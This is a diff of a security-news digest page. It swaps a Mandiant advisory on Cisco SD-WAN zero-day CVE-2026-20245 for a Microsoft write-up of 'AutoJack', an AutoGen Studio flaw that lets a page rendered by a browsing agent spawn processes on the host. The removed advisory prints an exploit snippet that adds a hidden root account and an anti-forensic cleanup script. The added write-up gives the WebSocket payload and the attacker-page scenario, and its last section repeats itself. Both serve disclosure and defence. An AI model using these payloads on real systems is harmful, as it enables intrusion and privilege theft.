@@ -59,9 +59,9 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-06-27</h1>
+        <h1>Security Briefing // 2026-06-28</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">FBI: Russian hackers now target Signal backup recovery keys</button></li><li><button onclick="show('art-1')">Time Travel Debugging with Codex</button></li><li><button onclick="show('art-2')">CISA sets urgent deadline to fix Cisco flaw exploited in attacks</button></li><li><button onclick="show('art-3')">CISA Adds Exploited PTC Windchill RCE Flaw to KEV as Web Shell Attacks Continue</button></li><li><button onclick="show('art-4')">Miasma Malware Targets npm Packages and GitHub Actions in Supply Chain Attack</button></li><li><button onclick="show('art-5')">Photo ZIP campaign targeting hospitality industry delivers Node.js implant for persistent access</button></li><li><button onclick="show('art-6')">Large Workflows with Local LLMs</button></li><li><button onclick="show('art-7')">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</button></li><li><button onclick="show('art-8')">Scattered Spider Hackers Plead Guilty on Day 1 of Trial</button></li><li><button onclick="show('art-9')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li></ul>
+            <ul><li><button onclick="show('art-0')">FBI: Russian hackers now target Signal backup recovery keys</button></li><li><button onclick="show('art-1')">Time Travel Debugging with Codex</button></li><li><button onclick="show('art-2')">CISA sets urgent deadline to fix Cisco flaw exploited in attacks</button></li><li><button onclick="show('art-3')">CISA Adds Exploited PTC Windchill RCE Flaw to KEV as Web Shell Attacks Continue</button></li><li><button onclick="show('art-4')">Miasma Malware Targets npm Packages and GitHub Actions in Supply Chain Attack</button></li><li><button onclick="show('art-5')">Photo ZIP campaign targeting hospitality industry delivers Node.js implant for persistent access</button></li><li><button onclick="show('art-6')">Large Workflows with Local LLMs</button></li><li><button onclick="show('art-7')">AutoJack: How a single page can RCE the host running your AI agent</button></li><li><button onclick="show('art-8')">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team</button></li><li><button onclick="show('art-9')">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
@@ -94,9 +94,9 @@ Anyone who believes they have fallen victim to the campaign is encouraged to rep
 Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen.
 The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection.
 [Get the whitepaper](https://hubs.li/Q04jQ9z40)
-Post a Comment Community Rules
-You need to login in order to post a comment
-Not a member yet? Register Now</div>
+Comments
+louislitt12 - 3 hours ago
+Yikes, phishers are getting clever. If you use Signal, treat your backup recovery key like a password: don't share it, enable device locks, verify links, and rotate keys if unsure. Stay vigilant, everyone.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
@@ -747,355 +747,416 @@ Future Work
             <hr class="separator">
         </div>
         <div id="art-7" class="article-body">
-            <h2 class="article-title">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager/" target="_blank">Original Link</a></p>
-            <div class="content-text">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager
-Mandiant
-Written by: Chester Sng, Pete Boonyakarn, Logeswaran Nadarajan, Lukasz Lamparski
-Introduction
-In early 2026, Mandiant identified a threat actor targeting SD-WAN infrastructure at a service provider. After gaining initial access, the threat actor exploited a zero-day vulnerability ([CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)) in Cisco Catalyst SD-WAN to escalate privileges from a compromised administrative account to root-level access.
-The vulnerability stems from the device’s file upload feature lacking the ability to properly filter malicious data.
-Throughout the intrusion, to maintain operational security and avoid detection, the threat actor consistently employed anti-forensic techniques, selectively deleting and restoring system configuration files that were modified during their activities.
-Key Observations
--
-Rogue Peering and Credential Manipulation: In March 2026, a threat actor established initial access via unauthorized peering connections to facilitate Secure Shell (SSH) access. The threat actor used that access to manipulate default account passwords to evade detection.
--
-Exploitation of CVE-2026-20245: Subsequently, the attacker leveraged a zero-day privilege escalation vulnerability (now tracked as CVE-2026-20245) in Cisco Catalyst SD-WAN Manager to gain root-level access via a malicious CSV upload.
--
-Extensive Anti-Forensic Cleanup: The threat actor deleted malicious files, reverted configuration changes, and executed a validation script to ensure indicators are purged.
-What is SD-WAN?
-Traditional Wide Area Networks (WANs) rely heavily on physical, proprietary hardware routers to direct traffic. This model is often rigid, complex to scale, and struggles to handle the demands of modern cloud computing.
-Software-Defined Wide Area Network (SD-WAN) solves this by decoupling the network’s management and control logic from the underlying physical hardware. Instead of configuring individual routers one by one, a centralized software controller is used to orchestrate the entire network from a single dashboard. SD-WANs are typically used by highly distributed organizations, such as banks, retail corporations, technology services, and healthcare providers, to securely connect multiple remote branch locations directly to central cloud services.
-What is Peering?
-Within an SD-WAN fabric, peering is the logical process of establishing a trusted, authenticated relationship between distinct network components, such as edge routers, regional hubs, and central controllers.
-Before any data can be securely transmitted across the network fabric, these devices must perform a digital handshake. During the peering phase, devices mutually authenticate each other using cryptographic certificates. Once identity and trust are verified, they exchange underlying routing tables and automatically build secure tunnels to facilitate safe data transport.
-Additional Vulnerabilities in Cisco Catalyst SD-WAN Controllers
-[CVE-2026-20127](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa-EHchtZk) and [CVE-2026-20182](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa2-v69WY2SW) are critical vulnerabilities recently disclosed by Cisco that affect the peering authentication mechanism for Cisco Catalyst SD-WAN controllers. Both vulnerabilities could allow an unauthenticated, remote attacker to bypass authentication and obtain administrative privileges.
-Intrusion Campaign Overview
-Initial Access Via Rogue Peering Connections
-From late 2025 to January 2026, Mandiant observed multiple unauthorized peering connections to the victim’s SD-WAN Manager devices. It is possible that these connections occurred due to the exploitation of CVE-2026-20127 or CVE-2026-20182 as the vulnerabilities were not disclosed, and patches were not available during this period.
-Beginning in March 2026, further unauthorized peering connections were seen on a device running a software version unaffected by CVE-2026-20127. However, Cisco confirmed that these connections did not leverage CVE-2026-20182 either, and could instead be using stolen certificate material from a previous compromise of the same device.
-It is unclear if the same threat actor was responsible for the late 2025 to January 2026 and March 2026 rogue peering activity.
-Successful Authentications By Altering The Admin Account Password
-In March 2026, the threat actor established new rogue peer connections and successfully authenticated to the SD-WAN Manager device via SSH using the vmanage-admin
-account on the same victim devices.
-Once authenticated via SSH, the threat actor executed commands to change the password of the default admin
-account. The threat actor authenticated directly to the SD-WAN Manager web application interface using the admin
-account and exfiltrated configurations of the SD-WAN fabric.
-[2026-03-07T01:31:48.464Z]"POST /j_security_check HTTP/1.1" 200 - 31 0 1288 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
-[2026-03-07T01:31:49.017Z] "GET /dataservice/system/device/vedges HTTP/1.1" 200 - 0 10114 127 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
-[2026-03-07T01:31:50.017Z] "GET /dataservice/system/device/controllers HTTP/1.1" 200 - 0 15815 100 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
-[2026-03-07T01:31:51.925Z] "GET /dataservice/template/config/attached/<Device ID> HTTP/1.1" 200 - 0 3732 18 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
-[2026-03-07T01:31:52.493Z] "GET /dataservice/template/config/running/<Device ID> HTTP/1.1" 400 - 0 134 19 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
-<...>
-Figure 1: Threat actor authentication and configuration extraction
-The threat actor subsequently used their active vmanage-admin
-session to change the password of the admin
-account back to its original state before terminating their active session. This activity was likely performed to reduce the probability of detection by an administrator trying to log into the device during day-to-day operations.
-The vmanage-admin
-and admin
-accounts are default accounts on Cisco Catalyst SD-WAN controllers that have different privileges, but [neither possesses root shell access](https://www.cisco.com/c/en/us/td/docs/routers/sdwan/17-x/systems-interfaces/systems-interfaces-guide-17-x/users-and-access.html).
-Exploitation of CVE-2026-20245 to Escalate Privileges
-Mandiant observed that in April 2026, after establishing an SSH session with the admin
-account, the threat actor exploited CVE-2026-20245 by executing the following command to upload a file named evil_tenant.csv
-:
-request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
-Figure 2: Malicious file upload
-[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx), a vulnerability reported to Cisco by Mandiant, exists in the command-line interface (CLI) of Cisco Catalyst SD-WAN Controllers that could allow an authenticated, local attacker to execute arbitrary commands as root by supplying a crafted file to the affected system.
-The evil_tenant.csv
-file contains the exploit payload. The following code block (Figure 3) shows a snippet of the exploit which attempts to append malicious entries to the system's /etc/passwd
-and /etc/shadow
-files.
-if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ] && grep -q '<redacted>' /usr/share/viptela/vbond_vsmart_tenant_list 2>/dev/null; then
-echo absent > /home/admin/.orig_vbond_vsmart_tenant_list.state;
-elif [ -e /usr/share/viptela/vbond_vsmart_tenant_list ]; then
-echo present > /home/admin/.orig_vbond_vsmart_tenant_list.state;
-cp -a /usr/share/viptela/vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list;
-else
-echo absent > /home/admin/.orig_vbond_vsmart_tenant_list.state;
-fi;
-cp -a /etc/passwd /home/admin/.orig_passwd;
-cp -a /etc/shadow /home/admin/.orig_shadow;
-grep -q '^troot:' /etc/passwd || echo 'troot:x:0:0:root:/root:/bin/bash' >> /etc/passwd;
-grep -q '^troot:' /etc/shadow || echo 'troot:<redacted>:19000:0:99999:7:::' >> /etc/shadow
-Figure 3: Appending malicious entries
-Through this command, the threat actor achieved the following:
--
-Backed up the original
-vbond_vsmart_tenant_list
-configuration file, which would have been overwritten by the contents ofevil_tenant.csv
-during the exploit. This backup was likely created to allow the actor to restore the file later, ensuring the SD-WAN Manager device did not load an invalid configuration that might alert administrators. -
-Created backups of the original
-/etc/passwd
-and/etc/shadow
-files. -
-Created a user account named
-troot
-with full root privileges.
-Mandiant subsequently observed the threat actor accessing this new troot
-account from the admin
-account via the su
-(substitute user) command.
-Anti-Forensic Techniques
-Mandiant identified that the threat actor deleted all files they created, including evil_tenant.csv
-, and restored any system configurations they modified. These deletion and modifications were done to minimize their forensic footprint.
-In addition to this, Mandiant also observed execution of a validation script, which checks if indicators of the threat actor's activities are removed.
-for f in /home/admin/evil_tenant.csv /home/admin/.orig_vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list.state /home/admin/.orig_passwd /home/admin/.orig_shadow;
-do if [ -e "$f" ];
-then echo PRESENT:$f; ls -ld "$f";
-else echo ABSENT:$f;
-fi;
-done;
-if grep -q '^troot:' /etc/passwd;
-then echo PRESENT:/etc/passwd:troot;
-else echo ABSENT:/etc/passwd:troot;
-fi;
-if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ];
-then echo PRESENT:/usr/share/viptela/vbond_vsmart_tenant_list; ls -ld /usr/share/viptela/vbond_vsmart_tenant_list;
-else echo ABSENT:/usr/share/viptela/vbond_vsmart_tenant_list;
-fi
-Figure 4: Validation script
-This script checks for the presence of the following:
--
-Threat actor-created files in
-/home/admin.
--
-troot
-account in thepasswd
-andshadow
-files. -
-vbond_vsmart_tenant_list
-, and if it exists, inspect information about the file. This is likely to check if the original file was restored.
-Outlook and Implications
-This campaign underscores the living off the edge paradigm, where threat actors prioritize the compromise of network appliances to bypass traditional security perimeters. As organizations increasingly adopt software-defined networking, the orchestrators managing these environments become primary targets. These devices offer a black box environment for threat actors: they often lack the telemetry required for deep forensic analysis, and their role as a central control plane provides a stealthy platform for persistent, wide-scale access to internal enterprise traffic. For state-sponsored actors, the ability to exploit zero-day vulnerabilities in these platforms remains a premier vector for long-term strategic intelligence collection. Google Threat Intelligence Group (GTIG) has [closely](https://cloud.google.com/blog/topics/threat-intelligence/zero-days-exploited-2022) [tracked](https://cloud.google.com/blog/topics/threat-intelligence/2023-zero-day-trends) [and](https://cloud.google.com/blog/topics/threat-intelligence/2024-zero-day-trends) [reported](https://cloud.google.com/blog/topics/threat-intelligence/2025-zero-day-review) on increased zero-day exploitation of edge devices over the past several years.
-Remediation and Hardening
--
-Perform IOC Sweep / Threat Hunting: Collect logs and diagnostic data from SD-WAN devices by executing
-request admin-tech
-command on all control-plane components. Scan these collections for known IOCs and execute threat hunts focused on the TTPs identified in the Detections and Hunting section of this blog post. If true positive hits are observed, perform a full investigation. -
-Manual Remediation Support: As per Cisco’s guidance, any confirmed indicators of compromise or suspicious activity should be forwarded to
-[Cisco Technical Assistance Center (TAC)](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html)for comprehensive review and remediation assistance. -
-Prioritize Immediate Patching and Upgrades: Organizations must prioritize upgrading Cisco Catalyst SD-WAN Manager to fixed software releases, specifically versions 20.9.9.2, 20.12.7.2, 20.15.4.5, 20.15.5.3, 20.18.3.1, 26.1.1.2, or later, to remediate
-[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). -
-Implement Cisco Catalyst SD-WAN Hardening and Logging Guidelines: Organizations should follow the comprehensive security best practices and configuration standards detailed in the
-[Cisco Catalyst SD-WAN Hardening Guide](https://sec.cloudapps.cisco.com/security/center/resources/Cisco-Catalyst-SD-WAN-HardeningGuide). This guide provides a robust defense-in-depth framework for securing all SD-WAN components including the management, control, and data planes against unauthorized access.
-Indicators of Compromise (IOCs)
-To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a free [GTI Collection](https://www.virustotal.com/gui/collection/d966161b93100fb8905b9b81bd03e57bbc93f21534acee88999e77798e913d5b/summary) for registered users.
-Network Indicators
-File Indicators
-Due to the threat actor's extensive anti-forensic cleanup, several files associated with this intrusion were overwritten or deleted. However, forensic remnants of the malicious CSV payload were recovered.
-Detections and Hunting
-Mandiant encourages organizations to conduct proactive threat hunts focused on the tactics, techniques, and procedures (TTPs) outlined in this report to identify activity that may otherwise blend into routine operations. Because certain indicators of compromises may mirror legitimate administrative actions, it is critical to assess these observations against the established network posture to minimize false positives.
-As per Cisco’s guidance, any suspicious activity or confirmed IOCs should be forwarded to the Cisco TAC for comprehensive review and assistance.
-Unauthorized SSH Connections as vmanage-admin
-Monitor authentication logs (/var/log/auth.log
-) for logins originating from unexpected external IP addresses using the vmanage-admin user account.
-Jan 01 07:58:00 vManage sshd[20766]: Accepted publickey for vmanage-admin from <Threat Actor IP> port 48373 ssh2: RSA SHA256:<redacted>
-Jan 01 08:01:00 vManage sshd[25178]: Accepted keyboard-interactive/pam for admin from <Threat Actor IP> port 60552 ssh2
-Figure 5: SSH from unexpected origins
-Suspicious Password Change Events
-Audit password changes in /var/log/auth.log
-targeting the admin account in quick succession, particularly where credentials are set and subsequently reverted.
-Jan 01 08:00:00 vManage usermod[12345]: change user 'admin' password
-Jan 01 08:15:00 vManage usermod[12345]: change user 'admin' password
-Figure 6: Password changes
-Defenders should also inspect rollback files present within /var/confd/rollback/
-for configuration delta commits targeting user passwords:
-# Created by: vmanage-admin
-# Date: 2026-01-01 08:00:00
-# Via: netconf
-# Type: delta
-# Label:
-# Comment:
-# No: 10000
-# TransactionId: 12345678
-# Hostname: vManage
-system {
-aaa {
-user admin {
-password <redacted>;
-}
-}
-}
-Figure 7: Rollback files
-Suspicious Execution of the su
-Command
-Audit terminal command history and system logs (/var/log/auth.log
-) for successful switch user (su
-) executions from the admin account to unauthorized accounts (e.g., troot
-).
-Jan 01 08:03:00 vManage su[24289]: Successful su for troot by admin
-Figure 8: su
-logins
-Exploitation of CVE-2026-20245
-Monitor script logs (/var/log/scripts.log
-) for execution anomalies involving unauthorized execution of vconfd_script_upload_tenant_list.sh
-.
-Jan 01 08:01:05 vManage vScript: Tenant list upload per vsmart serial number: /usr/bin/vconfd_script_upload_tenant_list.sh -cli path /home/admin/evil_tenant.csv vpn 0
-Jan 01 08:01:05 vManage vScript: uploading tenant list via VPN 0 true
-Jan 01 08:01:05 vManage vScript: Copying ... /home/admin/evil_tenant.csv via VPN 0
-Jan 01 08:01:05 vManage vScript: Successfully loaded the tenant placement file
-Figure 9: Execution anomalies
-Defenders can also query active command execution history using show history within the Viptela CLI for the specific administrative upload commands:
-01-01 08:01:05 -- request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
-Figure 10: Command execution
-Google Security Operations (SecOps)
-Google SecOps customers have access to these broad category rules and more under the Mandiant Intel Emerging Threats rule pack. The activity discussed in the blog post is detected in Google SecOps under the rule names:
--
-Privileged Account Append to Passwd Database
--
-Grep Privileged User Account Discovery in Passwd or Shadow
--
-Hidden Backup of Sensitive System Files
--
-Suspicious Copy from Usr Share to User Hidden Directory
-Acknowledgements
-Mandiant would like to thank the Cisco Product Security Incident Response Team (PSIRT) for their collaboration and partnership throughout the coordinated disclosure process.</div>
+            <h2 class="article-title">AutoJack: How a single page can RCE the host running your AI agent</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/06/18/autojack-single-page-rce-host-running-ai-agent/" target="_blank">Original Link</a></p>
+            <div class="content-text">Ongoing research into AI agent framework security identified an exploit chain in AutoGen Studio (AutoGen’s open-source prototyping user interface) that allows untrusted web content rendered by a browsing agent to reach a local Model Context Protocol (MCP) WebSocket and spawn arbitrary processes on the host. The technique, which we call AutoJack, jacks the agent into becoming the attacker’s last-mile delivery vehicle by crossing the localhost trust boundary that many developer tools rely on.
+We reported the behavior to the Microsoft Security Response Center (MSRC); following the report the maintainers hardened the upstream main branch in commit b047730. This issue was identified and addressed during development. The affected MCP WebSocket surface was never included in a Python Package Index (PyPI) release, so users who install AutoGen Studio from PyPI aren’t exposed to this specific chain.
+The broader lesson is general: if an agent can browse untrusted pages and also talk to privileged local services, loopback can become an attack surface and control planes must be authenticated, authorized, and isolated.
+Why we are looking at agent frameworks
+Modern AI agents are not just text generators. They read files, browse pages, call APIs, and shell out to tools. That is exactly what makes them useful, and exactly why there is investment in finding systemic execution risks in the frameworks that wire models to tools. Earlier in this series we covered RCE primitives in [Microsoft Semantic Kernel](https://www.microsoft.com/en-us/security/blog/2026/05/07/prompts-become-shells-rce-vulnerabilities-ai-agent-frameworks/). In this post we move one layer up the stack to an infrastructure and developer-facing prototyping surface and show how the same agent capabilities that make these tools valuable for experimentation can become a delivery channel for remote code execution when the prototype runs without safeguards.
+The takeaway is not to avoid prototypes. It is this: when an agent on your core server or laptop can browse the open web and communicate with privileged local services, localhost stops being a trust boundary. Defenders need to plan for that, and these findings show why.
+What is AutoGen Studio
+[AutoGen Studio](https://microsoft.github.io/autogen/docs/autogen-studio/getting-started) is a user interface (UI) on top of [AutoGen](https://microsoft.github.io/autogen/), Microsoft Research’s framework for multi-agent systems. It lets developers compose agents, attach tools, including MCP servers, and run quick experiments. Its documentation is clear about intended use. In other words, it is a research prototype with expected developer-experience tradeoffs: defaults tuned for ease of iteration rather than hardened deployment.
+The AutoJack chain at a glance
+The explanation below is for demonstrative purposes only. The exploit chain doesn’t work on current builds. It is included here so that defenders can recognize the pattern in other agent frameworks.
+The exploit chain composes three independent weaknesses in AutoGen Studio’s MCP WebSocket surface:
+- Origin allowlist trusts localhost – but a local agent is localhost (CWE-1385 – Missing Origin Validation in WebSockets): The MCP WebSocket only accepts connections whose Origin is http://127.0.0.1 or http://localhost. That blocks a browser pointed at evil.com. It does not block JavaScript that is rendered by a headless browser owned by an AutoGen agent on the same machine.
+- Authentication middleware is opt-out for MCP paths (CWE-306 – Missing Authentication for Critical Function): The auth middleware in AutoGen Studio explicitly skipped /api/mcp/* (and /api/ws/*) on the assumption that these would do their own checks. The MCP WebSocket handler did not implement that follow-up check. As a result, the MCP WebSocket accepted connections without any authentication regardless of the auth mode configured for the rest of the app.
+- StdioServerParams from the URL is executed verbatim (CWE-78 – Improper Neutralization of Special Elements used in an OS Command): The endpoint accepted a server_params query parameter, base64-decoded a JSON blob into StdioServerParams, and handed command + args to stdio_client(…). There was no allowlist – calc.exe, powershell.exe -enc …, or bash -c ‘…’ were all accepted as “MCP servers.”
+Chain these together with a webpage on the open internet, rendered by an AutoGen agent running on the same machine, and you have a remote code execution primitive. No user interaction is required beyond getting the agent to render the attacker’s page.
+We named the technique AutoJack: an attacker carjacks the browsing agent and uses it as a confused deputy to drive across the localhost boundary into AutoGen Studio’s MCP control plane.
+Anatomy of the chain
+Issue 1: Origin allowlist that the agent itself defeats
+AutoGen Studio’s MCP WebSocket relies on the conventional defense for browser-driven cross-site WebSocket hijacking (CSWSH): allow only same-origin connections from 127.0.0.1 / localhost.
+allowed_origins = [“http://127.0.0.1”, “http://localhost”]
+That is the right control for a human user opening a tab to evil[.]com. The browser will set the Origin header to hxxps://evil[.]com, the check will fail, and the connection will be refused.
+Origin checks alone are not the right control for an agent. An AutoGen agent equipped with built-in web-browsing tooling, such as MultimodalWebSurfer, fetch_webpage_tool, any Playwright-backed surfer, or a code-execution tool that runs requests/websockets is a process on the workstation. Anything it loads inherits the localhost identity. The “origin” of any JavaScript executed by that headless browser is whatever the agent navigated to – and the WebSocket call it then makes carries an Origin that satisfies the allowlist.
+Issue 2: Auth middleware that opts MCP out
+AutoGen Studio supports several authentication modes (none, github, msal, firebase). All of them are wired into a single AuthMiddleware that runs ahead of FastAPI route dispatch. In the version on PyPI, that middleware contains an early-return for WebSocket-style paths:
+1 2 3 | # auth excluded for these paths; they were intended to do their own checks if request.url.path.startswith("/api/ws") or request.url.path.startswith("/api/mcp"): return await call_next(request) |
+The intent is reasonable: ASGI middlewares cannot meaningfully gate WebSocket handshakes the same way they gate HTTP requests, so the design called for the WebSocket handler to enforce auth itself at accept time. The MCP (Model Context Protocol) route never picked up that responsibility. As a result, the table below holds for the released package:
+| Auth configuration | REST API protected? | /api/mcp/ws/* protected? |
+| type: none | No | No |
+| type: github | Yes | No |
+| type: msal | Yes | No |
+| type: firebase | Yes | No |
+Turning on auth in config.yaml does not close this hole on its own.
+Issue 3: server_paramsfrom the URL is the command line
+The MCP WebSocket route in the development build reads a server_params query parameter, base64-decodes it, JSON-parses it into StdioServerParams, and passes that into stdio_client(…):
+1 2 3 4 5 6 | @router.websocket("/ws/{session_id}") async def mcp_websocket(websocket: WebSocket, session_id: str): encoded = websocket.query_params.get("server_params") decoded = base64.b64decode(encoded) params = StdioServerParams(**json.loads(decoded)) await create_mcp_session(bridge, params, session_id) |
+StdioServerParams.command and StdioServerParams.args are passed to stdio_client, which uses them to spawn an MCP “server” process. There is no allowlist that the executable be an MCP-speaking binary, so the same plumbing happily spawns calc.exe, powershell.exe -enc …, or bash -c ‘…’.
+A minimal payload looks like:
+1 2 3 4 5 6 | { "type": "StdioServerParams", "command": "calc.exe", "args": [], "env": { "pwned": "true" } } |
+Base64-encoded into a query string, the full reach-out is:
+1 2 | ws://localhost:8081/api/mcp/ws/<session_id>?server_params=<base64(json)> </base64(json)></session_id> |
+Combined with Issues 1 and 2, all an attacker needs is for the agent to render a page that opens that URL.
+Putting it together: a realistic scenario
+To validate the end-to-end chain, we wrote two tiny harnesses:
+malicious_web_server.py: a web page served at http://attacker[.]example/websocket-interactive. Its only meaningful content is a <script> that opens the WebSocket above with a base64 payload that runs calc.exe.
+web_summarizer_app.py: a small “Web Content Summarizer” AutoGen agent wrapped in a Flask UI. The app takes a URL from the user and hands it to a MultimodalWebSurfer agent with the prompt “Browse this URL and summarize its content.” It is, in other words, a fully-fledged AutoGen agent that anyone could build on top of the framework – the Flask page is just the interface.
+The end-to-end flow looks like this:
+The developer has built an AutoGen agent such as a Web Page Summarizer, or any agent with browsing capabilities, that runs on the same machine as AutoGen Studio.
+An attacker plants a malicious comment on a legitimate news site, or a user asks the summarizer agent to summarize an attacker-controlled URL. This can happen through a direct prompt, a prompt injection in earlier content, or a URL field in the app.
+The agent’s browsing tool, MultimodalWebSurfer in our case, then navigates the headless browser to the attacker’s page.
+The page’s JavaScript opens ws://localhost:8081/api/mcp/ws/<id>?server_params=<base64>. Because the browser is on the same machine, the Origin is acceptable; because the auth middleware short-circuits /api/mcp/*, no token is required.
+AutoGen Studio decodes the payload and runs calc.exe (or anything else) under the developer’s account.
+Note that we packaged the demonstration as a controlled local proof of concept, See it end-to-end.
+The screenshots below show the full chain on a single workstation: the developer launches AutoGen Studio on localhost:8081 (the default port), opens the Web Content Summarizer app, and submits an attacker-controlled URL. Within seconds of MultimodalWebSurfer rendering the page, calc.exe pops on the developer’s desktop, launched by the AutoGen Studio process, not by the browser and not by the agent’s headless Chromium.
+Fixes and hardening measures applied
+The issue was fixed with the help of the Microsoft Security Response Center. The maintainers implemented the necessary hardening measures, helping protect users ahead of full release and broader adoption:
+Server-side parameter binding. On main, the WebSocket handler no longer reads server_params from the URL. A separate POST /api/mcp/ws/connect route stores the parameters server-side in pending_session_params, keyed by a universally unique identifier (UUID). The WebSocket handler pops the entry by session ID and refuses unknown IDs with close code 4004. The code comment is explicit: “This prevents attackers from injecting arbitrary server_params via the WebSocket query string.”
+Tighter auth skip list. The middleware skip-list on main no longer includes /api/mcp. It includes only /api/ws and /api/maker. MCP routes now flow through the normal auth path.
+These changes are present in the AutoGen main branch as of commit [b047730,](https://github.com/microsoft/autogen/commit/b0477309d2a0baf489aa256646e41e513ab3bfe8) and pyproject.toml on main is at version 0.7.2.
+Crucially, this issue was identified and remediated before any PyPI release, so the affected code never shipped in a published package. The exposure was limited to developers who built AutoGen Studio from the main GitHub branch during the window between the MCP plugin landing and the hardening commit. This was confirmed by downloading autogenstudio 0.4.2.2, the current published release, and inspecting its contents directly: the package doesn’t include autogenstudio/web/routes/mcp.py, the FastAPI application in app.py does not mount an /api/mcp router, and a recursive search across all 55 Python files found no matches for StdioServerParams or /api/mcp.. In other words, users who run pip install autogenstudio today gets a build that does not contain the MCP WebSocket attack surface at all.
+Mitigation and protection guidance
+If you are running AutoGen Studio
+Deploy AutoGen Studio strictly as a developer prototype in an isolated environment, not as an internet-exposed service, aligning as documented.
+If you install autogenstudio with pip (currently 0.4.2.2), you are not exposed to this specific chain. The issue was identified and addressed during development before any PyPI release, and the affected MCP WebSocket route is not present in the published package. The general guidance below still applies because the pattern (an agent on the box reaching localhost services) is broader than this one bug.
+If you build from the main branch for MCP support, use a build at or after commit [b047730](https://github.com/microsoft/autogen/commit/b0477309d2a0baf489aa256646e41e513ab3bfe8).
+Do not run AutoGen Studio with a browsing or arbitrary code execution agent on the same machine as untrusted content. That combination is the substrate the chain needs, and similar shapes will recur as the project evolves.
+Bind to loopback only and add a host firewall rule that blocks all non-loopback traffic to the port 8081 (default).
+Place AutoGen Studio behind an authenticated reverse proxy that enforces auth on all paths, including any future WebSocket or /api/* routes. Don’t rely on framework auth modes alone for control-plane endpoints.
+Run AutoGen Studio under a low-privilege account in a sandboxed user profile or container so that any future agent-driven RCE is contained to a dev profile, not your daily-driver account.
+If you are building agent apps on top of AutoGen
+The deeper lesson is broader beyond this one project. When an agent can both browse external content and reach privileged local services on localhost, it can unintentionally create a confused-deputy scenario. Defend against it by:
+Treating any tool parameter that is reachable from model output as attacker controlled.
+Refusing to bind sensitive control planes (debug endpoints, MCP control sockets, code executors, dev databases) to localhost without authentication. Loopback is an attack surface for any agent on that machine.
+Allowlisting which executables may be invoked as MCP “servers,” instead of accepting command/args from any caller.
+Separating the agent browsing identity from the developer’s identity (different OS user, container, or VM).
+How Microsoft helps secure agentic systems
+Microsoft security teams are actively researching how traditional software risks change when AI models connect to tools, browsers, code interpreters, and local services. This work informs guidance for developers and detections for defenders across Microsoft Defender, Microsoft Defender for Cloud, Microsoft Entra and Microsoft 365.
+Customers using Microsoft Defender, Microsoft Defender for Cloud, and Microsoft Entra can use these controls to detect, contain, and investigate related activity. Coverage depends on product licensing, configuration, and telemetry.
+At the model and agent layer (catch the manipulation)
+Azure AI Content Safety Prompt Shields detects user prompt injection and indirect prompt injection (cross-prompt injection attack, or XPIA), which can catch an early stage of this chain when attacker-controlled content steers an agent to navigate to a malicious page. Prompt Shields do not intercept the client-side JavaScript execution that follows, but they provide an early interception point when initial navigation is triggered through indirect prompt injection. Prompt Shields also integrate with Defender for Cloud AI threat protection so the security operations center (SOC) can see this signal.
+How Microsoft helps secure agentic systems
+Microsoft security teams are actively researching how traditional software risks change when AI models connect to tools, browsers, code interpreters, and local services. This work informs guidance for developers and detections for defenders across Microsoft Defender, Microsoft Defender for Cloud, Microsoft Entra and Microsoft 365.
+Customers using Microsoft Defender, Microsoft Defender for Cloud, and Microsoft Entra can use these controls to detect, contain, and investigate related activity. Coverage depends on product licensing, configuration, and telemetry.
+At the model and agent layer (catch the manipulation)
